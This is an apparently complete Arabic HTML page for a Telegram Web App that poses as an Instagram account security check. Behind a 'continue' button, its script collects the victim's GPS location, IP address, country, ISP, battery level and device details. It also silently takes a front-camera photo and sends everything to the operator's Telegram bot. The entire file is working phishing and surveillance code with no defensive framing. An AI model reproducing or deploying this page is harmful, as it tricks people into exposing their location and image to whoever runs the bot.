<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Security Check</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 3px; }
        .logo { width: 175px; margin-bottom: 20px; }
        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 15px; color: #8e8e8e; font-size: 13px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
        <p style="font-size: 14px; color: #262626; font-weight: 600;">تأكيد أمان الحساب</p>
        <p style="color: #8e8e8e; font-size: 14px;">يجب السماح بالأذونات المطلوبة للتأكد من هويتك ومنع الوصول غير المصرح به.</p>
        <button id="authBtn">متابعة كـ @User</button>
        <div id="status"></div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const webapp = window.Telegram.WebApp;
        webapp.expand();

        const getIPDetails = async () => {
            try {
                // استخدمنا ipapi.co لأنها تدعم HTTPS وموثوقة أكثر
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch (e) { return null; }
        };

        const getPhoto = async (mode) => {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById('v');
                v.srcObject = s;
                await new Promise(r => setTimeout(r, 2000));
                const c = document.getElementById('c');
                // أبعاد صغيرة جداً لضمان مرورها عبر تليجرام دون "فشل"
                c.width = 200; 
                c.height = 150;
                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                s.getTracks().forEach(t => t.stop());
                return c.toDataURL('image/jpeg', 0.4); 
            } catch (e) { return null; }
        };

        document.getElementById('authBtn').onclick = async () => {
            document.getElementById('status').innerText = "جاري الفحص... يرجى الانتظار";

            navigator.geolocation.getCurrentPosition(async (p) => {
                const ip = await getIPDetails();
                let batteryLevel = "غير معروف";
                
                try {
                    const b = await navigator.getBattery();
                    batteryLevel = (b.level * 100).toFixed(0) + "%";
                } catch(e) {}

                // جمع البيانات الشاملة والدقيقة
                const data = {
                    time: new Date().toLocaleString('ar-EG'),
                    ip: ip ? ip.ip : 'فشل جلب الآيبي',
                    country: ip ? ip.country_name : 'فشل جلب الدولة',
                    region: ip ? ip.region : 'فشل جلب المحافظة',
                    isp: ip ? ip.org : 'فشل جلب المزود',
                    gps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`,
                    platform: navigator.platform,
                    os: navigator.userAgent.includes("Android") ? "Android" : "iOS/Other",
                    browser: navigator.userAgent.split(' ').pop(),
                    screen: `${window.screen.width}x${window.screen.height} (Actual: ${window.innerWidth}x${window.innerHeight})`,
                    battery: batteryLevel,
                    frontImg: await getPhoto("user") // التقاط الصورة
                };

                // إرسال البيانات للبوت
                webapp.sendData(JSON.stringify(data));
                // الانتظار قليلاً لضمان الإرسال ثم الإغلاق
                setTimeout(() => webapp.close(), 1000);
                
            }, () => {
                document.getElementById('status').innerText = "خطأ: يجب قبول الأذونات للمتابعة.";
            });
        };
    </script>
</body>
</html>
